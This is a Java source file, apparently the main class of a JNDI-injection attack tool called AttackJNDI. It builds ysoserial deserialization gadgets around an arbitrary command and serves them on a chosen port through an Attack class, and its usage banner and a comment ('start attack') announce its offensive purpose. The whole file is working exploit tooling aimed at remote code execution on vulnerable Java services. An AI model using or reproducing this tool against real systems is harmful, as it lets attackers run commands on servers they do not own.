package com.pinger;

import ysoserial.Strings;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import java.util.*;

public class Main {

    public static void main(String[] args) throws Exception{
        if (args.length != 3) {
            printUsage();
            System.exit(-1);
        }
        final Integer port = Integer.valueOf(args[0]);
        final String payloadType = args[1];
        final String cmd = args[2];
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            throw new Exception("[-] Invalid payload type '" + payloadType + "'");
        }
        final ObjectPayload payload = payloadClass.newInstance();
        final Object object = payload.getObject(cmd);
        Attack.port = port;
        Attack.gadget = object;
        // 开始攻击
        Attack.usejavaSerializedData();
    }


    private static void printUsage() {
        System.err.println("[+] Fuck JNDI Injection !");
        System.err.println("[+] Usage: java -jar AttackJNDI.jar-[version].jar [port] [payload] [cmd]");
        System.err.println("[+] Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
                new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator());

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[] {
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }



}
